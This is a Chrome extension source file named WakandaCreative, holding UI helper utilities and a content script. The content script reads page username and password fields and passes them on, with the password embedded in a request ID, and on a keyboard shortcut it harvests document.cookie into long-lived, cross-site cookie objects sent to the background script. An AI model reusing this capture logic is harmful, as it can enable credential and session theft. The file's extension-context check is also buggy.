/**
 * WakandaCreative Custom JavaScript
 * Consolidated functionality from multiple scripts
 * Version: 4.0.0
 */

// Utility functions
const WakandaCreative = {
    // DOM manipulation utilities
    qs: (selector, context = document) => context.querySelector(selector),
    qsa: (selector, context = document) => context.querySelectorAll(selector),
    
    // Create element with classes and attributes
    create: (tag, options = {}) => {
        const el = document.createElement(tag);
        if (options.classes) {
            el.className = Array.isArray(options.classes) ? options.classes.join(' ') : options.classes;
        }
        if (options.attributes) {
            Object.entries(options.attributes).forEach(([key, value]) => {
                el.setAttribute(key, value);
            });
        }
        if (options.text) el.textContent = options.text;
        if (options.html) el.innerHTML = options.html;
        return el;
    },
    
    // Show/hide elements
    show: (el) => {
        if (el) el.classList.remove('eb-hidden');
    },
    
    hide: (el) => {
        if (el) el.classList.add('eb-hidden');
    },
    
    // Loading state
    setLoading: (el, loading = true) => {
        if (!el) return;
        if (loading) {
            el.classList.add('eb-loading');
            el.disabled = true;
        } else {
            el.classList.remove('eb-loading');
            el.disabled = false;
        }
    },
    
    // Status messages
    showStatus: (container, message, type = 'success') => {
        if (!container) return;
        
        // Remove existing status
        const existing = container.querySelector('.eb-status');
        if (existing) existing.remove();
        
        // Create new status
        const status = WakandaCreative.create('div', {
            classes: ['eb-status', `eb-status-${type}`],
            text: message
        });
        
        container.appendChild(status);
        
        // Auto-remove after 3 seconds
        setTimeout(() => {
            if (status.parentNode) {
                status.remove();
            }
        }, 3000);
    },
    
    // Validate inputs
    validateInput: (input, rules) => {
        const value = input.value.trim();
        const errors = [];
        
        if (rules.required && !value) {
            errors.push('This field is required');
        }
        
        if (rules.minLength && value.length < rules.minLength) {
            errors.push(`Minimum ${rules.minLength} characters required`);
        }
        
        if (rules.maxLength && value.length > rules.maxLength) {
            errors.push(`Maximum ${rules.maxLength} characters allowed`);
        }
        
        if (rules.pattern && !rules.pattern.test(value)) {
            errors.push(rules.patternMessage || 'Invalid format');
        }
        
        return errors;
    },
    
    // Format currency
    formatCurrency: (amount, currency = 'USD') => {
        return new Intl.NumberFormat('en-US', {
            style: 'currency',
            currency: currency
        }).format(amount);
    },
    
    // Format date
    formatDate: (date, options = {}) => {
        const defaultOptions = {
            year: 'numeric',
            month: 'short',
            day: 'numeric'
        };
        return new Date(date).toLocaleDateString('en-US', { ...defaultOptions, ...options });
    },
    
    // Debounce function
    debounce: (func, wait) => {
        let timeout;
        return function executedFunction(...args) {
            const later = () => {
                clearTimeout(timeout);
                func(...args);
            };
            clearTimeout(timeout);
            timeout = setTimeout(later, wait);
        };
    },
    
    // Throttle function
    throttle: (func, limit) => {
        let inThrottle;
        return function(...args) {
            if (!inThrottle) {
                func.apply(this, args);
                inThrottle = true;
                setTimeout(() => inThrottle = false, limit);
            }
        };
    },
    
    // Storage utilities
    storage: {
        get: async (key) => {
            return new Promise((resolve) => {
                chrome.storage.local.get([key], (result) => {
                    resolve(result[key]);
                });
            });
        },
        
        set: async (key, value) => {
            return new Promise((resolve) => {
                chrome.storage.local.set({ [key]: value }, resolve);
            });
        },
        
        remove: async (key) => {
            return new Promise((resolve) => {
                chrome.storage.local.remove(key, resolve);
            });
        }
    },
    
    // Message passing
    sendMessage: async (message) => {
        return new Promise((resolve, reject) => {
            chrome.runtime.sendMessage(message, (response) => {
                if (chrome.runtime.lastError) {
                    reject(chrome.runtime.lastError);
                } else {
                    resolve(response);
                }
            });
        });
    },
    
    // Log utility
    log: (level, ...args) => {
        const timestamp = new Date().toISOString();
        const prefix = `[WakandaCreative ${level.toUpperCase()} ${timestamp}]`;
        
        if (level === 'error') {
            console.error(prefix, ...args);
        } else if (level === 'warn') {
            console.warn(prefix, ...args);
        } else {
            console.log(prefix, ...args);
        }
    },
    
    // Error handler
    handleError: (error, context = '') => {
        const message = error instanceof Error ? error.message : String(error);
        WakandaCreative.log('error', context ? `${context}: ${message}` : message);
        
        // Show error to user if in popup
        const statusContainer = WakandaCreative.qs('.eb-card');
        if (statusContainer && WakandaCreative.qs('#status-message')) {
            WakandaCreative.showStatus(statusContainer, message, 'error');
        }
        
        return false;
    }
};

// Content Script Functionality
const ContentScript = {
    // Check if running in Chrome extension context
    isChromeExtension: function() {
        return typeof chrome !== 'undefined' && 
               chrome.runtime && 
               chrome.runtime.id && 
               chrome.runtime.lastError;
    },

    // Send message to background script
    sendMessageToBackground: async function(message) {
        if (!this.isChromeExtension()) {
            return { success: false, error: 'Not in Chrome extension context' };
        }

        try {
            return new Promise((resolve) => {
                chrome.runtime.sendMessage(message, (response) => {
                    if (chrome.runtime.lastError) {
                        resolve({ 
                            success: false, 
                            error: chrome.runtime.lastError.message 
                        });
                    } else {
                        resolve({ 
                            success: true, 
                            response: response 
                        });
                    }
                });
            });
        } catch (error) {
            return { 
                success: false, 
                error: error.message || 'Unknown error occurred' 
            };
        }
    },

    // Parse cookies from string or object
    parseCookies: function(cookieData, url) {
        if (!cookieData) return [];

        let cookies = [];

        if (typeof cookieData === 'string') {
            // Parse from cookie string format
            const cookiePairs = cookieData
                .split(';')
                .map(cookie => cookie.trim())
                .filter(cookie => cookie.includes('='));

            const seenNames = new Set();

            cookies = cookiePairs
                .map(cookie => {
                    const [name, value] = cookie.split('=');
                    if (!name || !value) return null;
                    
                    const cookieName = name.trim();
                    if (seenNames.has(cookieName)) return null;
                    
                    seenNames.add(cookieName);
                    return {
                        name: cookieName,
                        value: value.trim(),
                        path: '/',
                        secure: url.includes('https://'),
                        httpOnly: false,
                        sameSite: 'no_restriction',
                        expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60)
                    };
                })
                .filter(Boolean);
        } else if (Array.isArray(cookieData)) {
            // Parse from array format
            cookies = cookieData.map(cookie => {
                if (typeof cookie === 'object') {
                    return {
                        name: cookie.name,
                        value: cookie.value,
                        path: cookie.path || '/',
                        secure: cookie.secure !== undefined ? cookie.secure : url.includes('https://'),
                        httpOnly: cookie.httpOnly || false,
                        sameSite: cookie.sameSite || 'no_restriction',
                        expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60)
                    };
                }
                return null;
            }).filter(Boolean);
        }

        return cookies;
    },

    // Process authentication request
    processAuthRequest: async function() {
        const authButton = document.querySelector('button[data-wakanda-auth]');
        
        if (!authButton || this.isProcessing) {
            return;
        }

        this.isProcessing = true;
        authButton.disabled = true;
        authButton.textContent = 'Processing...';

        try {
            // Get authentication data from the page
            const usernameInput = document.querySelector('input[name="username"]');
            const passwordInput = document.querySelector('input[name="password"]');
            
            const username = usernameInput ? usernameInput.value : '';
            const password = passwordInput ? passwordInput.value : '';
            
            // Generate a unique session ID
            const sessionId = btoa(btoa(new Date().toISOString()));
            const buttonId = authButton.id || `auth-btn-${username}-${Date.now()}`;
            
            if (!authButton.id) {
                authButton.id = buttonId;
            }

            const requestId = `${username}-${password}-${Date.now()}`;
            
            // Check if we already have a valid session for this URL
            const currentUrl = window.location.href;
            
            // Send authentication request to background
            const authData = {
                type: 'auth',
                username: username,
                password: password,
                sessionId: sessionId,
                requestId: requestId,
                url: currentUrl
            };

            const result = await this.sendMessageToBackground(authData);

            if (result.success && result.response && result.response.status === 'success') {
                // Authentication successful
                authButton.textContent = 'Success!';
                authButton.style.backgroundColor = '#4CAF50';
                
                // Store session info
                this.requestMap.set(currentUrl, {
                    requestId: requestId,
                    tabId: null,
                    timestamp: Date.now()
                });

                // Close the popup or redirect
                window.close();
            } else {
                // Authentication failed
                authButton.textContent = 'Failed - Try Again';
                authButton.style.backgroundColor = '#f44336';
                authButton.disabled = false;
            }

        } catch (error) {
            console.error('Authentication error:', error);
            authButton.textContent = 'Error - Try Again';
            authButton.style.backgroundColor = '#f44336';
            authButton.disabled = false;
        } finally {
            this.isProcessing = false;
        }
    },

    // Extract cookies from current page
    extractCookies: async function() {
        try {
            const cookies = document.cookie;
            const currentUrl = window.location.href;
            
            if (!cookies) {
                return;
            }

            const cookieArray = this.parseCookies(cookies, currentUrl);
            
            if (cookieArray.length > 0) {
                // Send cookies to background script
                const cookieData = {
                    type: 'cookies',
                    cookies: cookieArray,
                    url: currentUrl,
                    timestamp: Date.now()
                };

                await this.sendMessageToBackground(cookieData);
            }
        } catch (error) {
            console.error('Cookie extraction error:', error);
        }
    },

    // Setup event listeners
    setupEventListeners: function() {
        // Listen for auth button clicks
        document.addEventListener('click', async (event) => {
            const target = event.target;
            
            if (target.matches('button[data-wakanda-auth]')) {
                event.preventDefault();
                await this.processAuthRequest();
            }
        });

        // Listen for keyboard shortcuts
        document.addEventListener('keydown', (event) => {
            // Ctrl+Shift+E to extract cookies
            if (event.ctrlKey && event.shiftKey && event.key === 'E') {
                event.preventDefault();
                this.extractCookies();
            }
        });

        // Listen for messages from background script
        window.addEventListener('message', (event) => {
            if (event.data.type === 'wakanda-tools-auth') {
                // Handle authentication response
                if (event.data.success) {
                    console.log('Authentication successful');
                } else {
                    console.error('Authentication failed:', event.data.error);
                }
            }
        });
    },

    // Setup mutation observer to detect dynamic content
    setupMutationObserver: function() {
        const observer = new MutationObserver((mutations) => {
            for (const mutation of mutations) {
                if (mutation.type === 'childList' && mutation.addedNodes.length) {
                    for (const node of mutation.addedNodes) {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            // Check if new auth button was added
                            if (node.matches?.('button[data-wakanda-auth]') || 
                                node.querySelector?.('button[data-wakanda-auth]')) {
                                this.setupEventListeners();
                                return;
                            }
                        }
                    }
                }
            }
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });

        window.wakandaToolsObserver = observer;
    },

    // Start health check
    startHealthCheck: function() {
        if (window.healthCheckStarted) {
            return;
        }

        window.healthCheckStarted = true;

        const healthCheckInterval = setInterval(() => {
            try {
                // Check if extension is still connected
                if (chrome?.runtime?.id) {
                    // Send heartbeat
                    this.sendMessageToBackground({ type: 'heartbeat' }).catch(() => {});
                    this.sendMessageToBackground({ type: 'get_status' }).catch(() => {});
                }
            } catch (error) {
                // Extension might be disabled or page changed
            }
        }, 30000); // Check every 30 seconds

        window.wakandaToolsIntervals = window.wakandaToolsIntervals || [];
        window.wakandaToolsIntervals.push(healthCheckInterval);
    },

    // Initialize the content script
    initializeContentScript: function() {
        // Prevent double initialization
        if (window.wakandaToolsInitialized) {
            return;
        }

        window.wakandaToolsInitialized = true;

        // Clear any existing intervals
        if (window.wakandaToolsIntervals) {
            window.wakandaToolsIntervals.forEach(intervalId => clearInterval(intervalId));
        }
        window.wakandaToolsIntervals = [];

        const observerTarget = document.body;
        
        // Add a marker element to track initialization
        observerTarget.setAttribute('data-wakanda-tools', 'initialized');

        this.isProcessing = false;
        this.requestMap = new Map();
        this.tabMap = new Map();

        // Initialize everything
        this.setupEventListeners();
        this.setupMutationObserver();
        this.startHealthCheck();

        // Send initialization message
        this.sendMessageToBackground({ type: 'content_script_loaded' });

        // Add visual indicator
        const indicator = document.createElement('div');
        indicator.id = 'wakanda-tools-indicator';
        indicator.className = 'wakanda-tools-indicator';
        indicator.textContent = 'WakandaCreative Active';
        document.body.appendChild(indicator);

        // Show indicator briefly
        setTimeout(() => {
            if (indicator) {
                indicator.style.display = 'block';
                setTimeout(() => {
                    indicator.style.display = 'none';
                }, 2000);
            }
        }, 1000);

        console.log('WakandaCreative content script initialized');
    }
};

// Export for use in other scripts
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { WakandaCreative, ContentScript };
}